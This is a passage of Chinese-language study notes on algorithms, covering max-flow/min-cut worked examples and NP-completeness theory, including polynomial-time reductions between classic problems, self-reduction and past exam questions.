DFS，能遍历到的节点都属于 S 集合，剩下的节点都属于 T 集合。\n\n| 初始容量网络                                         | 最终残量网络                                         | 最小割                                               |\n| ---------------------------------------------------- | ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20211016110427.png) | ![](https://img.jwt1399.top//img/20211016132856.png) | ![](https://img.jwt1399.top//img/20211016145010.png) |\n\n**因此最小割为{ {s,v1,v2,v4}{t,v3}}，容量(最大流)为 5**\n\n### ❹流与割\n\n对任意流 f，任意割 (A, B)，**流的大小为流出A的流量与流入A的流量之差**。\n\n![](https://img.jwt1399.top/img/image-20211021153436806.png)\n\n例如如下 ，A集合为黑色小圆圈，B集合为白色小圆圈\n\n![](https://img.jwt1399.top/img/image-20211021152515576.png)\n\nval(f) = (10 + 10 + 5 +10 + 0 + 0) - (5 +5 + 0 +0 ) = 25\n\n![](https://img.jwt1399.top/img/image-20211021152742760.png)\n\nval(f) = (20 + 22) - (8 + 4 + 4 ) = 26\n\n### ❺真题练习\n\n#### ➀题目1\n\n计算下图中从S到T的最大流和最小割.\n\n![](https://img.jwt1399.top//img/20211016201257.gif)\n\n增广路径：(*S*, *A*, *B*, *T*)，网络流大小+6\n\n增广路径：(*S*, *B*, *E*, *T*)，网络流大小+4      \n\n增广路径：(*S*, *A*, *D*, *E*, *T*)，网络流大小+3\n\n增广路径：(*S*, *C*, *E*, *T*)，网络流大小+3\n\n\n\n![](https://img.jwt1399.top//img/20211016201305.png)\n\n**最大流 6 + 4 + 3 + 3 = 16**\n\n**最小割 [ {S，A，B，C，D，E}，{T} ]**\n\n#### ➁题目2\n\n求下图中S和T间的最大流，要求给出最少两个中间计算步骤。\n\n![](https://img.jwt1399.top//img/20211016201320.png)\n\n增广路径：(S，C，F，T），流量值+1\n\n增广路径：(S，C，B，F，T)，流量值+1\n\n增广路径：(S，A，B，F，T)，流量值+1\n\n增广路径：(S，A，D，T )，流量值+1\n\n增广路径：(S，A，E，D，T )，流量值+1\n\n增广路径：(S，A，E，T)，流量值+1\n\n增广路径：(S，B，F，E，T)，流量值+3\n\n![闹闹友情提供](https://img.jwt1399.top/img/202112091215288.png)\n\n**最大流 1 + 1 + 1 + 1 + 1 + 1 + 3  = 9**\n\n## ⑦NP完备性理论\n\n> **本章重点：**\n>\n> - 理解什么是多项式归约（polynomial-time reduction）\n>\n> - 从一个问题 A 多项式归约到另一个问题 B 时，掌握针对问题 A 的任意实例构造问题 B 的实例的方法。\n> - 自身归约\n> - 掌握如果P≠NP ，P、NP和NPC三个集合之间的关系， 以及NP问题定义的非对称性\n> - 记住证明一个问题属于NPC的基本步骤\n> - 能证明给定的问题是NP完全问题\n\n### ❶P&NP&NPC\n\n#### ➀基础概念\n\n- **P(Polynomial-time，多项式时间)：**能在多项式时间内求解的问题。\n  - 多项式时间算法，对于规模为 n 的输入，在最坏情况下的运行时间是O(n<sup>k</sup>)，其中 k 为某一确定常数。\n  - 伪多项式时间算法，典型的0-1背包问题算法复杂度为O(n*W)，其运行时间与输入的规模相关，是伪多项式的。\n\n- **NP(Nondeterministic Polynomial-time，非确定性多项式时间)：**能多项式时间内可以被验证的问题\n- **NPC(NP Completeness，NP完全)：**NP中最难的问题，可能没有多项式时间算法的问题 ，满足两个条件①是一个NP问题②所有的NP问题都可以约化到它\n- **NP-Hard**：比NP问题都要难的问题，满足NPC问题的第二条，但不一定要满足第一条\n\n#### ➁P&NP&NPC关系\n\n- 当 P ≠ NP 时，NP 问题和 NP-hard 的交集就是 NPC 问题\n- 当 P = NP 时，P = NP = NPC\n\n![](https://img.jwt1399.top/img/image-20211129115054549.png)\n\n####  ➂NP问题定义的非对称性\n\n这个问题小简也不太懂，不知道如何写，有知道的大佬可以给小简讲讲吗\n\n### ❷多项式时间归约\n\n**归约**\n\n描述：在研究不同问题的难度时，希望表达“问题 Y 至少像问题 X 一样的难”，这就是归约。\n\n定义：设计一个函数 f(x)，把问题 A 的输入转换成问题 B 的一个输入，这样就能用问题 B 的解法来求解。这样就是归约技术，将这个问题转换为类似的其他问题。\n\n**多项式时间归约**\n\n描述：所谓多项式归约是指转换函数 f(x) 不能太复杂，需要在多项式时间内完成，如果是指数级或其他复杂度就没有意义了。\n\n定义：如果问题 X 和问题 Y 满足以下两条性质，那么问题 X 可以在多项式时间归约到问题 Y 。记为：X ≤<sub>p </sub>Y \n\n- 问题 X 可以通过多项式时间的基本运算步骤转换为问题 Y；\n- 问题 X 多项式次调用求解问题 Y 的算法，且问题 Y 可以在多项式时间内被求解。\n\n根据以上定义，可以得到三个**定理**：\n\n- 假设 X ≤<sub>p</sub> Y，如果 Y 能够在多项式时间内求解，那么 X 也能在多项式时间内求解。\n- 假设 X ≤<sub>p</sub> Y，如果 X 不能在多项式时间内求解，那么 Y 也不能在多项式时间内求解。\n- 如果 X ≤<sub>p</sub> Y 且 Y ≤<sub>p</sub> X，那么 X  ≡<sub>p</sub> Y， 即 X 和 Y 等价。\n\n例题：\n\n| ![](https://img.jwt1399.top//img/image-20211029191456394.png) | ![](https://img.jwt1399.top//img/image-20211029191959453.png) |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| C                                                            | B                                                            |\n\n**有多项式时间算法的问题和可能没有多项式时间算法的问题**\n\n| 有多项式时间算法   | 可能没有多项式时间算法 |\n| ------------------ | ---------------------- |\n| 最短路问题         | 最长路问题             |\n| 最小割问题         | 最大割问题             |\n| 2元可满足性问题    | 3元可满足性问题        |\n| 平面图4着色问题    | 平面图3着色问题        |\n| 二部图顶点覆盖问题 | 一般图顶点覆盖问题     |\n| 匹配问题           | 3D匹配问题             |\n| 素性测试问题       | 质因子分解问题         |\n| 线性规划问题       | 整数线性规划问题       |\n\n看到这里，小简觉得你已经对归约有了一个基本的认知，但是我们如何进行规约呢，莫慌莫慌，下面小简将对具体问题如何规约进行详细叙述，友情提示下方内容高能，请读者做好心理准备，耐心阅读，反复研读，加油！\n\n### ❸一般归约方法\n\n归约是指问题 A 的任何实例能用问题 B 的方法来解决（判断），并且 A 的解为“是”，当且仅当 B 的解也是“是”。因此，证明归约是**双向的**，目前遇到的大多归约问题（A ≤<sub>p</sub> B）都可以按以下步骤进行：\n\n1. 构造图 G ，存在问题 A 的解集；\n2. 在图 G 基础上，构造图 G'（常添加边或点），使得问题 A 的解集能反应在 G' 中问题 B 的解集（注意两个问题解集的规模 k 一定要有确定的联系）；\n3. 图 G 中存在问题 A 的解集 S，当且仅当图 G' 中存在问题 B 的解集 S' ；\n4. 规约的正确性，需双向证明。\n\n也有不用构造新图的，比如点覆盖到独立集的规约，这种方法叫直接规约。但大多有些难度的归约一般都需要构造。\n\n### ❹重点掌握的归约\n\n#### ①顶点覆盖≡<sub>p</sub>独立集\n\n> **Vertex-Cover ≡<sub>p </sub>Independent Set（顶点覆盖 ≡<sub>p </sub>独立集）**\n\n`顶点覆盖问题：`给定一个图 G = ( V , E )和一个整数 k ，是否存在一个大小为 k 的顶点子集，使图中每一条边至少有一个顶点在上述顶点子集中。\n\n如图，黑色的点集合都是顶点覆盖集合，图的每一条边都至少有一个顶点在点集合中。\n\n![顶点覆盖集(黑色)](https://img.jwt1399.top/img/202111111714918.webp)\n\n`独立集问题：`给定一个图 G = ( V，E )和一个整数 k ，是否存在一个大小为 k 的顶点子集，使子集中任意两个顶点不邻接。即顶点集合中的任意两个点之间没有边。\n\n如图，红色s的点集合都是独立集，任意两个红色的顶点没有边。\n\n![独立集(红色)](https://img.jwt1399.top/img/202111111714615.webp)\n\n例题：\n\n<img src=\"https://img.jwt1399.top//img/image-20211029192154553.png\" alt=\"选C\" style=\"zoom:80%;\" />\n\n**两个问题可以归纳为：**\n\n独立集问题：    给定图 G 和数 k ，问 G 是否包含大小为 k 的独立集？\n顶点覆盖问题：给定图 G 和数 k ，问 G 是否包含大小为 k 的顶点覆盖？\n\n> **（顶点覆盖 ≡<sub>p </sub>独立集）问题描述**：设图 G = ( V , E ) ，S ⊆ V，若 S 是一个大小为 k 的`独立集`当且仅当 V − S 是一个大小为 n − k 的`顶点覆盖`\n\n`证明:`\n**⇒** \n\n​\tS 是图 G 的任一独立集\n​\t则任意边 (u,v) ∈ E，有u ∉ S 或 v ∉ S 或 u,v 都 ∉ S；那么 u∈V-S 或 v∈V-S 或 u,v 都 ∈ S\n​\t所以图的任意边 (u,v) 至少有一个顶点在集合 V-S 中，即集合 V-S 是一个顶点覆盖\n\n**⇐** \n\n​\tV-S 是图 G 的任一顶点覆盖\n​\t则任意边 (u,v) ∈ E，有 u ∈ V-S 或 v ∈ V-S 或 u,v 都 ∈ V-S ；那么 u ∉ S 或 v ∉ S 或 u,v 都 ∉ V-S\n​\t所以图的任意边至少有一个端点不在集合 S 中，集合 S 是一个独立集\n\n∴  Vertex-Cover ≡<sub>p</sub> Independent Set\n\n#### ②顶点覆盖≤<sub>p</sub>集合覆盖\n\n> **Vertex-Cover ≤<sub>p</sub> Set-Cover（顶点覆盖 ≤<sub>p </sub>集合覆盖）**\n\n`集合覆盖问题：`给定 n 个元素的集合 U , S<sub>1</sub>，S<sub>2</sub>，... ，S<sub>m</sub> 是 U 的子集，给定数 k ， 问在这些子集中是否有几组子集，它们的并集等于整个 U 且至多含有 k 组子集？\n\n如图，集合覆盖大小为 k = 2 \n\n![](https://img.jwt1399.top//img/image-20211029184922160.png)\n\n例题：\n\n![选C](https://img.jwt1399.top//img/image-20211029192302351.png)\n\n> **（顶点覆盖 ≤<sub>p </sub>集合覆盖）问题描述：**给任意一个顶点覆盖问题的实例 G=（V，E）和 k，都能构造出对应的集合覆盖实例（U，S，k）。集合覆盖大小为 k 当且仅当顶点覆盖大小为 k 。\n\n`证明：`\n\n构造思路：原顶点覆盖的顶点相当于集合覆盖中的子集合，原顶点覆盖的边相当于集合覆盖的子集合中元素。\n\n![](https://img.jwt1399.top//img/image-20211029193948736.png)\n\n**⇒**\n\n​\t令 X ⊆ V 为 G 中大小为 k 的顶点覆盖，则 Y = {S <sub>v</sub> | v ∈ X } 为大小为 k 的集合覆盖。\n**⇐** \n\n​\t令 Y ⊆ S 为 (U，S，k) 中大小为 k 的集合覆盖，则 X = { v | S<sub>v</sub> ∈ Y } 为 G 中大小为 k 的顶点覆盖。\n∴  Vertex-Cover ≤<sub>p</sub> Set-Cover\n\n#### ③3-SAT≤<sub>p</sub>独立集\n\n> **3-SAT ≤<sub>p</sub> Independent Set（3-SAT ≤<sub>p </sub> 独立集）**\n\n`SAT问题：`SAT 问题叫作布尔可满足性问题（Boolean satisfiability problem）\n\n给定变量集 X = {x<sub>1</sub>，x<sub>2</sub>，... ，x<sub>n</sub>} 上的一组子句 C<sub>1</sub>，C<sub>2</sub>，... ，C<sub>n</sub> ，子句为 X 中一些元素的并集，多个子句的交集构成一个合取范式，问是否存在使合取范式为真的分配方案？\n\n`3-SAT问题：`3-SAT 问题叫作三元可满足性问题。\n\n若限定 SAT问题合取范式中的每个子句中元素的数量为 3 个，则为 3-SAT 问题。\n\n> **（3-SAT ≤<sub>p </sub> 独立集）问题描述：**给定一个 3-SAT 问题的实例 Ф ，我们都能构造出一个图 G = ( V , E ) 独立集问题的实例。3-SAT问题有解，当且仅当 G 中 k = ∣ Ф ∣，∣ Ф ∣ 大小为合取范式中子句的个数。\n\n`证明：`\n\n构图思路：\n\n- *G*中三个顶点构成一个三角形表示一个子句，每个节点表示一个元素\n- 每个顶点与其对立节点连线\n\n![](https://img.jwt1399.top/img/202111111714726.png)\n\n规约的正确性，需双向证明，即独立集存在，则 Ф 被满足；Ф 被满足，则独立集存在。\n**⇒**\n\n​\t图 G 存在大小为 k 的独立集，那么各三角形中必然有一点在独立集中（三角形内的点均相邻，不独立）；\n​\t将这 k 个点（变量）的值设为 true，那么其余所有点的取值均可确定下来；\n​\t因为这 k 个点在 k 个不同的句子中，则 Ф 能被满足。\n**⇐**\n\nФ 被满足，在 k 个句子中选取三个变量设为 true，它们对应图 G 中 k 个三角形中的 k 个点；\n这 k 个点刚好构成图 G 大小为 k 的独立集（因为互反的变量不会同时为 true，即不会同时在 k 个点中）。\n\n∴  3-SAT ≤<sub>p</sub> Independent Set\n\n`①②③总结：`3-SAT ≤<sub>p</sub> 独立集问题 ≡<sub>p</sub>  顶点覆盖 ≤<sub>p</sub> 集合覆盖\n\n#### ④顶点覆盖≤<sub>p</sub>支配集\n\n> **Vertex-Cover ≤<sub>p</sub> Dominating-Set（顶点覆盖 ≤<sub>p </sub>支配集问题）**\n\n`支配集问题：`给定无向图 G 和正整数 k，问图 G 中是否存在 k 个顶点的子集 s ，使得对于图 G 中的任意顶点 v ，要么 v∈s，要么 v 至少与 S 中的至少一个顶点相邻。\n\n> **（顶点覆盖 ≤<sub>p </sub>支配集问题）问题描述：**给任意一个顶点覆盖问题的实例 G=（V，E）和 k，都能构造出对应的支配集实例 G'。支配集大小为 k 当且仅当顶点覆盖大小为 k 。\n\n`证明：`\n\n构图思路：对给定的图G，作如下处理：对于图G的任意一边uv，添加一个点w，使得该边的两个顶点u、v分别与w相邻，得到新的一个无向图G’。\n\n![](https://img.jwt1399.top/img/202111101836405.png)\n\n**⇒**\n\n假设 s 是 G 的一个顶点覆盖，由于所有边都被 s 覆盖，因此图 G' 所有顶点也都被 s 所支配。\n**⇐**\n\n假设 s 是 G' 的一个支配集，如果 s 含有新顶点 w，它可以被 v 或者 u 替换并且仍旧是一个支配集（因为顶点 v 和 u都能覆盖 w 所覆盖的顶点），可以假定 s 仅包含 G 中的顶点。由于 s 支配了所有新顶点，它一定至少包含原图中每条边的两端顶点之一，因此它也是 G 的一个顶点覆盖。\n\n∴  Vertex-Cover ≤<sub>p</sub> Dominating-Set\n\n#### ⑤有向图Ham≤<sub>p</sub>无向图Ham\n\n> **Directed Ham-cycle ≤<sub>p</sub>  Ham-cycle（有向图哈密尔顿圈 ≤<sub>p</sub> 无向图的哈密尔顿圈）**\n\n`哈密尔顿圈：`设有一个图 G=(V,E)，若其上存在一个圈 C，这个圈包含该图上的每一节点，则称该圈 C 为哈密顿圈，图 G 称为哈密顿图。下图就是一个含有哈密顿圈的哈密顿图。\n\n![](https://img.jwt1399.top/img/image-20211108203843315.png)\n\n> **（有向图哈密尔顿圈 ≤<sub>p</sub> 无向图的哈密尔顿圈）问题描述：**给定一个 n 个节点的有向图 G = ( V , E ) ，我们可以构造一个含 3n 个顶点的无向图 G ′。有向图 G 拥有哈密尔顿圈当且仅当无向图 G ′ 拥有哈密尔顿圈。\n\n`证明：`\n\n构图思路：把有向图 G 中的一个顶点，拆分成三个顶点(蓝、黑、白)\n\n![](https://img.jwt1399.top/img/202111082108366.png)\n\n⇒\n假设 G 存在一个有向的哈密尔顿圈 Γ ，那么 G′ 也有一个跟上述顺序一致的无向哈密尔顿圈 Γ′\n⇐\n假设 G′ 有一个无向哈密尔顿圈 Γ′ ，Γ′ 访问 G′ 中的顶点必须选择以下两种顺序中的一个：\n\n- 黑，白，蓝\n- 黑，蓝，白\n\nΓ′ 中的黑色节点对应 Γ 中的哈密尔顿圈或者逆序中的一个。\n\n∴  Directed Ham-cycle  ≤<sub>p</sub> Ham-cycle\n\n#### ⑥**3−SAT≤<sub>p</sub>有向图Ham**\n\n>  **(3−SAT ≤<sub>p </sub>有向图哈密尔顿圈)问题描述：**给定一个 3−SAT 的实例，我们都能构造出一个图 G，3−SAT 实例有解当且仅当图 G 含有一个哈密尔顿圈。\n\n`证明：`\n\n构图思路：\n\n- 图 G 中哈密尔顿圈的个数为 2<sup>n</sup> 个，每个元素有真假 2 种可能，一共有 n 个，从左到右赋值为真，从右到左赋值为假\n- 对于每个子句，若存在 x<sub>i</sub> ，则增加一个节点，并从左到右增加边；若存在 ¬x<sub>i</sub>，则增加一个节点，并从右到左增加边\n\n![](https://img.jwt1399.top/img/image-20211205231006836.png)\n\n- 对每个变量 xi(1≤i≤n)，创建 3m+3 个顶点，命名为v<sub>i,1</sub>，v<sub>i,2</sub>，⋯  v<sub>i,3m+3</sub> 并且对相邻序号的两个顶点添加互相之间的有向边。如果 x<sub>i</sub> = 1，则形成从左向右的一个路径；如果 ¬x<sub>i</sub>=1，则形成从右向左的一个路径。\n- 对每个 1≤i≤n−1，添加四条有向边(v<sub>i,1</sub>,v<sub>i+1,1</sub>),(v<sub>i,3m+3</sub>,v<sub>i+1,3m+3</sub>),(v<sub>i,1</sub>,v<sub>i+1,3m+3</sub>),(v<sub>i,3m+3</sub>,v<sub>i+1,1</sub>)\n- 添加两个节点 s,t，添加有向边(s,v<sub>1,1</sub>),(s,v<sub>1,3m+3</sub>),(v<sub>n,1</sub>,t),(v<sub>n,3m+3</sub>,t)。然后再添加有向边(t,s)。这时得到的图中有 hamiltonian cycle。\n- 对于每一个 clause C<sub>j </sub>= z<sub>1</sub>z<sub>2</sub>z<sub>3</sub>，创建对应的顶点 C<sub>j</sub>。\n  - 如果 z = x<sub>i</sub>，则添加有向边 (v<sub>i,3j</sub>,C<sub>j</sub>) 和 (C<sub>j</sub>,v<sub>i,3j+1</sub>) ; \n  - 如果z = ¬xi，则添加有向边 (C<sub>j</sub>,v<sub>i,3j</sub>) 和 (v<sub>i,3j+1</sub>,C<sub>j</sub>)。\n  - 这里 1 ≤ j ≤ m,1 ≤ i ≤ n。\n- 如对子句C<sub>1</sub> = x<sub>1</sub>∨¬x<sub>2</sub>∨x<sub>3</sub> 生成如下图中蓝色所示。\n  - 如果选择子句中 x1 = 1，则 x<sub>1</sub> 对应的路径为从左向右；\n  - 如果选择 ¬x<sub>2</sub>=1，则 x<sub>2</sub> 对应的路径为从右到左；\n  - 如果选择 x<sub>3</sub>=1，则 x<sub>4</sub> 对应的路径为从左到右。\n- 这样我们就得到了最终的图G。\n\n![](https://img.jwt1399.top/img/image-20211205234535016.png)\n\n⇒\n\n- 假设 3−SAT 实例 ϕ 有满足的真值指派 x<sup>∗</sup>，那么我们在 G 中找到一个哈密尔顿圈 Γ 如下：\n\n  - 如果 x<sub>i</sub><sup>∗</sup> = true 我们从左到右穿过第 i 行\n\n  - 如果 x<sub>i</sub><sup>∗</sup> = false 我们从右到左穿过第 i 行\n\n\n- 对于每个字句 C<sub>j</sub> ，至少存在一行 i 按照我们上述的方向，把子句节点拼接进圈内(我们只把子句节点拼接进圈有且仅有一次)\n\n⇐ \n\n- 假设 G 中有一个哈密尔顿圈 Γ \n- 如果 Γ 加入了子句节点 C<sub>j</sub>  ，\n  - 并假设与 C<sub>j</sub>  前后邻接的节点通过边 e ∈ E 相连。\n  - 我们从圈中删除节点 C<sub>j</sub> 和其直连边，并用边 e 代替，得到 G − { C<sub>j</sub> } 的哈密尔顿圈。\n\n- 循环执行上述方法，我们得到在 G − { C<sub>1</sub>  , C<sub>2</sub>  , … , C<sub>k</sub> } 上的哈密尔顿圈 Γ′\n- 如果 Γ′ 在第 i 行的遍历方向是从左到右的，那么置 x<sub>i</sub><sup>∗</sup>  = true ，否则置  x<sub>i</sub><sup>∗</sup>= false \n- 按照上述正确方向遍历进行真值指派，每个子句都会被满足，即原实例 ϕ 可满足。\n\n#### ⑦哈密尔顿圈≤<sub>p</sub>旅行售货员\n\n> **Ham-cycle ≤<sub>p</sub> TSP（哈密尔顿圈 ≤<sub>p</sub> 旅行售货员问题）**\n\n`TSP：`给定 n 个城市以及两两城市之间的距离 d(u,v)，问是否存在一个旅游访问 n 个城市一次且长度 ≤ D。\n\n> **问题描述：**给定一个哈密尔顿圈的实例  G = (V,E)，创建一个 TSP 问题的完全图实例 G'， n 个城市两两间的距离函数定义如下：![](https://img.jwt1399.top/img/image-20211201230052384.png)\n>\n> TSP问题有一个长度 ≤ n 的旅游当且仅当 G 中含有一个哈密尔顿圈\n\nTSP实例满足三角形不等式：d(u,w) ≤ d(u,v)+d(v,w)\n\n\n\n\n<table>\n    <tbody>\n        <tr>\n            <td><input type=\"text\" placeholder=\"🔔请输入文章查看码，看更多内容\"></td>\n            <td><button class=\"btn\">Button</button></td>\n        </tr>\n</tbody></table>\n\n\n#### ⑧三着色 ≤<sub>p</sub> k着色\n\n> **3-Color ≤<sub>p</sub> K-Color (K > 3)（三着色问题 ≤<sub>p</sub> k着色问题）**\n\n\n\n<table>\n    <tbody>\n        <tr>\n            <td><input type=\"text\" placeholder=\"🔔请输入文章查看码，看更多内容\"></td>\n            <td><button class=\"btn\">Button</button></td>\n        </tr>\n</tbody></table>\n\n\n#### ⑨哈密尔顿圈≤<sub>p</sub>最长路径\n\n> **Ham-Cycle ≤<sub>p</sub> Longest-Path（哈密尔顿圈 ≤<sub>p </sub>最长路径）**\n\n`Longest-Path：`给定一个有向图 G = (V,E)，是否存在至少由 k 条边组成的简单路径？\n\n\n\n<table>\n    <tbody>\n        <tr>\n            <td><input type=\"text\" placeholder=\"🔔请输入文章查看码，看更多内容\"></td>\n            <td><button class=\"btn\">Button</button></td>\n        </tr>\n</tbody></table>\n\n\n#### ⑪子集和≤<sub>p</sub>分区问题\n\n> **Subset-Sum ≤<sub>p</sub> Partition（子集和问题 ≤<sub>p </sub>分区问题）**\n\n`Subset-Sum：`给定 n 个数 w<sub>1</sub> , … , w<sub>n</sub> 和整数 W，是否存在一个子集，其中所有元素的和等于 W。\n\n`Partition：`给定元素个数为 m 的集合 V ={v<sub>1</sub> , v<sub>2</sub> , … , v<sub>m</sub>} ，是否可以将集合 V 分割成两个子集，使每个子集各元素之和为 1/2∑v<sub>i</sub>  。即集合 A 能划分成元素之和相等的两部分。\n\n>(**子集和问题 ≤<sub>p </sub>分区问题)问题描述：**给定一个集合 S = {w<sub>1</sub> , w<sub>2</sub> , … , w<sub>n</sub>}，子集和为 W，需构造集合 S'，使得集合 S 存在一个子集之和为 W，当且仅当集合 S' 存在一个 Partition\n\n`证明：`\n\n构图思路：构造分区问题集合 S' = \\{v<sub>1</sub> , v<sub>2</sub> , … , v<sub>n</sub>, v<sub>n+1</sub>, v<sub>n+2</sub>}，其中：\n\nv<sub>1</sub> = w<sub>1</sub>，v<sub>2</sub> = w<sub>2</sub>, ... , v<sub>n</sub> = w<sub>n</sub>，v<sub>n+1</sub> = 2∑w<sub>i</sub> - W，v<sub>n+2</sub> = ∑w<sub>i</sub> + W\n\n由于分割问题总和为 4∑w<sub>i</sub>  ，所以 v<sub>n+1 </sub> 和 v<sub>n+2</sub> 不能在同一子集，不然该子集和为3∑w<sub>i</sub>，最终不能均分。要使每部分和为 2∑w<sub>i</sub> ，只能是如下情况：\n\n![](https://img.jwt1399.top/img/image-20211129154202796.png)\n\n⇒\nS 存在一个子集 A = {a<sub>1</sub> , a<sub>2</sub> , … , a<sub>k</sub>}，其中 a<sub>k</sub> ∈ S，k≤n 且 ∑a<sub>i</sub> = W\n\n那么集合 S' 中，有 ∑<sub>i∈A</sub> a<sub>i</sub> + v<sub>n+1</sub> = ∑<sub>i∈S-A</sub> a<sub>i</sub> + v<sub>n+2</sub> = 2∑w<sub>i</sub>\n\n所以集合 S' 存在一个划分 A ∪ {v<sub>n+1</sub>} 和 S-A ∪ {v<sub>n+2</sub>} \n⇐\n集合 S' 能被划分为两个和相等的集合，可知 v<sub>n+1</sub> 和 v<sub>n+2</sub> 不在一个划分子集里\n\n那么，存在一个集合 A，设其元素之和为 Y，有 Y + v<sub>n+1</sub> = ∑<sub>i∈S</sub> w<sub>i</sub> - Y + v<sub>n+2</sub>\n\n解出 Y = W。\n\n∴  Subset-Sum ≤<sub>p</sub> Partition\n\n#### ⑩子集和≤<sub>p</sub>背包问题\n\n> **Subset-Sum ≤<sub>p</sub> Knapsack（子集和问题 ≤<sub>p</sub> 背包问题）**\n\n`Knapsack：`给定一个物品集合 X ，重量为 u<sub>i</sub> ≥ 0 ，价值 v<sub>i</sub> ≥ 0 ，背包能承受的总重量不超过 U，给定一个目标价值 V，是否存在一个子集 S ⊆ X 使得 ∑<sub>i∈S</sub> u<sub>i</sub>≤*U*，∑<sub>i∈S</sub> v<sub>i</sub>≥V\n\n>**(子集和问题 ≤<sub>p</sub> 背包问题)问题描述：**给定一个集合 S = {w<sub>1</sub> , w<sub>2</sub> , … , w<sub>n</sub>}，子集和为 W，需构造集合 S'，使得集合 S 存在一个子集之和为 W，当且仅当集合 S' 存在一个背包实例\n\n`证明：`\n\n构图思路：对于任意一个子集和实例，我们构造一个背包实例：u<sub>i</sub> = v<sub>i</sub> = w<sub>i</sub>，U = V = W\n\n ⇒\nS 存在一个子集 A = {a<sub>1</sub> , a<sub>2</sub> , … , a<sub>k</sub>}，其中 a<sub>i</sub> ∈ S，k≤n 且 ∑a<sub>i</sub> = W\n\n那么集合 S' 中，有 ∑a<sub>i</sub>  = ∑u<sub>i</sub> = ∑v<sub>i</sub> = W，∴  ∑u<sub>i</sub> = U，∑v<sub>i</sub> = V\n\n所以集合 S' 存在一个背包实例\n⇐\n集合 S' 中存在一个背包实例，可知 ∑<sub>i∈S</sub> u<sub>i</sub>≤*U*，∑<sub>i∈S</sub> v<sub>i</sub>≥V\n\n那么，存在一个集合 A，设其元素之和为 Y，有 Y  = W\n\n∴  Subset-Sum ≤<sub>p</sub> Knapsack\n\n#### ⑫分区问题 ≤<sub>p </sub>k负载均衡\n\n> **Partition ≤<sub>p</sub> k-Load-Balance（分区问题≤<sub>p </sub>k负载均衡）**\n\n\n\n<table>\n    <tbody>\n        <tr>\n            <td><input type=\"text\" placeholder=\"🔔请输入文章查看码，看更多内容\"></td>\n            <td><button class=\"btn\">Button</button></td>\n        </tr>\n</tbody></table>\n\n\n\n### ❺自归身约\n\n> 掌握同一个问题的最优化问题如何多项时间归约到该问题的判断问题（自身归约），例如顶点覆盖问题，Hamilton Cycle问题，3-Color问题\n\n#### ➀基础概念\n\n**自身规约：**将求解(最优化)问题多项时间归约到该问题的判断问题。\n\n如果判断问题能够解决，那么就可以利用判断问题来解决求解问题。\n\n**自归约步骤**\n\n1. 设该判断算法为 A ，利用算法 A 判断出图中存在...(大小为k的...)；\n2. 删除一条边或点(看具体是边集还是点集的问题)，对删除边/点后的图运行判断算法 A ；\n3. 若图中还存在...(大小为k的...)，则从图中彻底删除该边/点；若不存在，则把该边/点加入集合 S 中；\n4. 对所有的边/点调用算法 A 执行上述操作，最终得到的集合 S 就是求解问题的解。\n\n看完以上解题步骤，小简觉得你应该还是有点点懵懵的，但别担心，看完下面的具体案例你再回来研读解题步骤，我相信你对自身规约会有不一样的认知，加油！\n\n#### ➁Vertex-Cover问题\n\n假如我们能判断一个图中是否存在点数为 k 的最小点覆盖。请你设计构造最小点覆盖问题的多项式时间算法。\n\n- 设该判断算法为 A ，利用算法 A 判断图 G 是否存在点数为 k 的最小点覆盖\n  - 若不存在，则结束；\n  - 若存在，则在图中删除一个点 v；\n- 再用算法 A 判断图 G = (V-v, E) 中是否存在点数为 k 的最小点覆盖\n  - 若存在，则将点 v 从图中彻底删除；\n  - 若不存在，则把点 v 加入到集合 S 中；\n- 不断重复上述操作，最终 S 中的所有点就是最小点覆盖。\n\n#### ➂Hamilton Cycle问题\n\n(2020)如果存在判断任意简单无向图是否存在哈密尔顿圈的多项式时间算法，请你设计构造任意简单无向图的哈密尔顿圈（如果存在的话）的多项式时间算法。\n\n算法：\n\n//设该判断算法为A\nS 初始化为空集；\n首先算法 A 判断图 G 中是否存在哈密尔顿圈，如果不存在则算法结束，如果存在则继续寻找哈密尔顿圈；\nFor every edge e in G {\n\t如果 G – {e} 中不存在哈密尔顿圈，则将 e 添加到集合 S 中；\n\t否则 G = G – {e}；\n} \n最终所得集合 S 中的所有边构成图 G 的哈密尔顿圈。\n\n#### ➃3-Color问题\n\n> 3-Color问题：对一个图的顶点进行三种颜色着色使得相邻两个点的颜色不一样\n\n(2018/2019)对于三着色问题，若存在一个多项式时间算法判断一个图是否可以三着色，则存在一个多项式时间算法对可以进行三着色的图找到一个可行的三着色。\n\n解法一：不断加边进去然后进行判断，直到不能加边为止。这样三种颜色的点就是图中三个独立集。  \n\n解法二：不断将两个不相邻的点合并成一个点然后进行判断，直到不能再合并为止。最后剩下三个点。\n\n#### ➄Longest-Path\n\n如果存在一个多项式时间算法判断一个图是否存在一个长度为 k 的路径，则存在一个多项式时间算法要么找到图中一个长度为 k 的路径要么证明此图不存在长度为 k 的路径。\n\n- 假设存在判断一个图 G 是否存在一个长度为 k 的路径的多项式时间算法 A \n\n- 首先用算法 A 判断图 G 是否存在一个长度为 k 的路径\n  - 若不存在，则结束；\n  - 若存在，则在图中删除一条边 e ；\n- 再用 A 判断图 G = (V, E-e) 中是否存在长度为 k 的一条路径\n  - 若存在，则将边 e 从图中彻底删除；\n  - 若不存在，则把边 e 加入到集合 S 中；\n-  重复上述操作，最终 S 中的所有边构成的边就是长度为 k 的一条路径。\n\n#### ➅Subset-Sum问题\n\n如果存在一个多项式时间算法判断一个集合 V 存在一个子集且其中元素的和等于 W，则存在一个多项式时间算法要么找到图中一个和为 W 的子集要么证明此集合不存在和为W的子集。\n\n- 假设存在判断一个集合 V 是否存在一个和为 W 的子集的多项式时间算法 A \n\n- 首先用算法 A 判断该集合 V 是否存在和为 W 的子集\n  - 若不存在，则结束；\n  - 若存在，则在集合中删除一个元素 v ；\n- 再用 A 判断 V - v 中是否存在和为 W 的子集\n  - 若存在，则将元素 v 从集合中彻底删除；\n  - 若不存在，则把元素 v 加入到集合 S 中；\n- 重复上述操作，最终 S 构成的集合就是和为 W 的子集。\n\n### ❻真题练习\n\n#### ➀题目1\n\n证明问题属于NPC的基本步骤\n\n- Step 1. 证明该问题是NP问题.\n\n- Step 2. 找到一个已知的NP完全问题X.\n\n- Step 3. 证明问题X可以多项式归约到该问题.\n\n#### ➁题目2\n\n(2018)给出一个图和一个整数k，问是否可以在这个图上删除k个点使得剩余图上没有三角形（含有3个顶点的圈）。证明这个问题是NP完全的。  